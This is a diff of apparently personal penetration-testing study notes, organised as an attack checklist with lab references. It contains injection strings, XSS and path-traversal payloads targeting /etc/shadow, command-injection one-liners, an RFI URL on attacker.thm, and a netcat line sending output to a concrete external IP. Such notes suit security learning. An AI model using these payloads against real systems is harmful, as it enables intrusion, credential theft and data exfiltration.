@@ -1,71 +1,85 @@
 -----Initial access:------
 
 1. Content discovery:
-	** nmap -sV -sC IP;
-	** looking for old versions -> search in dbexploit -> exploit ; Vulnerable and Outdated Components
+	** Open port and version: nmap -sV -sC IP;
+	** Vulnerable and Outdated Components: looking for old versions -> search in dbexploit -> exploit.
 
 	
 2. Upload files:
-	** Check if blacklist or whitelist -> create a folder example.abcd and check response ;
-	** Check where is the filter in client or server ;
+	**Steps:
+		- Check if blacklist or whitelist -> create a folder example.abcd and check response ;
+		- Check where is the filter in client or server ;
 
 3. Sql injection:
-	** 'OR 1=1-- '
-	** sqlmap - command for GET: sqlmap -u "<URL>" ; POST: sqlmap -u "<URL>" --data="username=admin&password=test"
+	** manual check: 'OR 1=1-- '
+	** automatic tool: sqlmap - command for GET: sqlmap -u "<URL>" ; POST: sqlmap -u "<URL>" --data="username=admin&password=test"
 
 4. XSS attact:
-	** Reflected (url example) , stored (blog example) , Dom (window.location example) 
-	** Proof Of Concept: <script>alert(1);</script>
-	**then -> Session Stealing ; Key Logger; Business Logic;
-	** payload:  https://github.com/payloadbox/xss-payload-list?tab=readme-ov-file
+	** Types: Reflected (url example) , stored (blog example) , Dom (window.location example) 
+	** Steps:
+		- Proof Of Concept: <script>alert(1);</script>
+		- then -> Session Stealing ; Key Logger; Business Logic;
+	** More payload:  https://github.com/payloadbox/xss-payload-list?tab=readme-ov-file
 	** Perfecting your payload: https://tryhackme.com/r/room/xss
 
-5.Broken Access Control - IDOR attack:
-	** Change vals in the request. (example: http://...id=3 --> http://...id=5
-	** Encoded data: decode(base64 in general) -> change the val -> encode again.
-	** Hash: using  https://crackstation.net/ for find the val of the hashed value.
-	** 
+5. Broken Access Control - IDOR attack:
+	** Types: Regular, encoded and hash.
+	   	- Change vals in the request. (example: http://...id=3 --> http://...id=5.
+		- Encoded data: decode(base64 in general) -> change the val -> encode again.
+		- Hash: using  https://crackstation.net/ for find the val of the hashed value.
 
-6.authentication bypass:
+
+6. Authentication bypass:
 	** Username Enumeration - response for invalid username.
-	** Brute force / Insecure Design - different ip for unblock
-	** Logic Flaw - add a field in post/get (for eample in restart password. add email to send the reset email).
+	** Brute force.
+	** Insecure Design - Different ip for unblock.
+	** Logic Flaw - add a field in post/get (for eample in restart password. add the field "email:" to send the reset email).
 	** Cookie Tampering - deHash them -> edit -> hash
 
 	
-6. Try create a reverse shell by nc:
-	** ls | nc 109.67.147.80 5050 
+7. Create a reverse shell by nc:
+	** Proof Of Concept: ls | nc 109.67.147.80 5050 
+	** Payload - Folder reverse_shell.
+	** http://109.67.147.80:5050/
 
 
-7. directory Path Traversal attack:
-	** ../../../etc/passwd | /etc/shadow 
-	** ....//....//....//....//....//etc/passwd
-	** %2e%2e%2f represents ../
-	** for more methods - https://owasp.org/www-community/attacks/Path_Traversal
-	** adding the Null Byte at the end of the payload (NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.)
-	**RFI - ?lang= / get=? (http://attacker.thm/cmd.txt)
+9. Directory Path Traversal attack:
+	**Payload types:
+		- ../../../etc/passwd | /etc/shadow 
+		- ....//....//....//....//....//etc/passwd
+		- %2e%2e%2f represents ../
+	** For more methods - https://owasp.org/www-community/attacks/Path_Traversal
+	** Adding the Null Byte at the end of the payload (NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.)
+	** RFI - ?lang= / get=? (http://attacker.thm/cmd.txt). Run the local server.
 	
-8. Looking for SSRF:
+10. Looking for SSRF:
 	** Using burpsuite and analyze the data.
 	** Change the server and send the message to our server.
-	**Looking source page for valu="";
+	**Looking source page for tpes. Example: value="";
 	
-	
-9.Phishing - using Gophish (server in directory).
 
-10.Cryptographic Failures
+11.Cryptographic Failures:
+	**Asumption - Connected to the network.
+	** Steps:
+		- Using Wireshark for hold the package.
+		- Scan and find encrypted data.
+		- Try to decode this.
 
-11.Command Injection - This vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine’s operating system. For example, taking input from a field and searching for an entry into a file.
-	** shell operators ;, & and && will combine two (or more) system commands and execute them both.
-	** Regular and bind - '; whoami ;' (regular).
+12.Command Injection - 
+	** Explain: languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine’s operating system. 
+	   For example, taking input from a field and searching for an entry into a file.
+	** Types:
+	 	- shell operators ;, & and && will combine two (or more) system commands and execute them both.
+	 	- Regular and bind - '; whoami ;' (regular).
 			    - grep '; whoami ;' products.txt (bind)
 			    - ping (bind)
 	** Bypassing Filters - using hexa value for example
 	** $(whoami) in bash
 	**for more: https://tryhackme.com/r/room/oscommandinjection
 
-12. Cryptographic Failures - need to be connect to the network.
 
 13. Data Integrity Failures - looking for cookies and using JSON Web Tokens (JWT)
 
 14. Windows Privilege Escalation - https://tryhackme.com/r/room/windowsprivesc20
+
+15.Phishing - using Gophish (server in directory Gophish).
